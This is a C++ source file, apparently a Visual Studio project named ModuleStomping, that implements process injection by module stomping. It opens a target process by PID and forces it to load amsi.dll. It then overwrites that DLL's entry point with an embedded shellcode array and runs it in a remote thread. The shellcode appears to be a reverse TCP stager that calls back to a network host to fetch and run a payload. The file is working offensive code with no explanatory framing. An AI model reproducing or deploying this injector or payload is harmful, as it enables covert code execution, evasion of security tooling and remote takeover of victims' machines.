// ModuleStomping.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <Psapi.h>

int main()
{
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x51"
        "\x56\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
        "\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
        "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
        "\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48\x18\x50\x49"
        "\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
        "\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
        "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
        "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
        "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x92\x80\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
        "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
        "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
        "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
        "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
        "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
        "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
        "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
        "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
        "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
        "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
        "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
        "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
        "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
        "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
        "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
        "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
        "\xf0\xb5\xa2\x56\xff\xd5";


    HANDLE notepad = OpenProcess(PROCESS_ALL_ACCESS, false, 12704);

    if (notepad == INVALID_HANDLE_VALUE)
    {
        std::cout << "Error getting Handle";
    }

    WCHAR moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";

    LPVOID LibName = VirtualAllocEx(notepad, 0, sizeof moduleToInject, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (LibName == NULL)
    {
        std::cout << "Error allocating Memory Page" << std::endl;
    }

    BOOL success = WriteProcessMemory(notepad, LibName, moduleToInject, sizeof moduleToInject, NULL);

    if (!success)
    {
        std::cout << "Error writing process memory" << std::endl;
    }

    LPTHREAD_START_ROUTINE LoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryW");

    HANDLE dllThread = CreateRemoteThread(notepad, NULL, 0, LoadLibrary, LibName, 0, NULL);
    WaitForSingleObject(dllThread, 1000);

    HMODULE modules[512];
    DWORD modSz;
    EnumProcessModules(notepad, modules, sizeof modules, &modSz);

    DWORD modNum = modSz / sizeof(HMODULE);


    HMODULE remModule = NULL;
    WCHAR remModName[128];
    for (DWORD i = 0; i < modNum; i++)
    {
        remModule = modules[i];
        GetModuleBaseName(notepad, remModule, remModName, sizeof remModName);

        if (wcscmp(remModName, L"amsi.dll") == 0)
        {
            break;
        }
    }

    DWORD headerBufferSize = 0x1000;
    LPVOID remoteHeaders = VirtualAlloc(0, headerBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    ReadProcessMemory(notepad, remModule, remoteHeaders, headerBufferSize, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)remoteHeaders;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)remoteHeaders + dosHeader->e_lfanew);
    LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remModule);

    WriteProcessMemory(notepad, dllEntryPoint, (LPCVOID)buf, sizeof(buf), NULL);
    
    CreateRemoteThread(notepad, NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);

}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
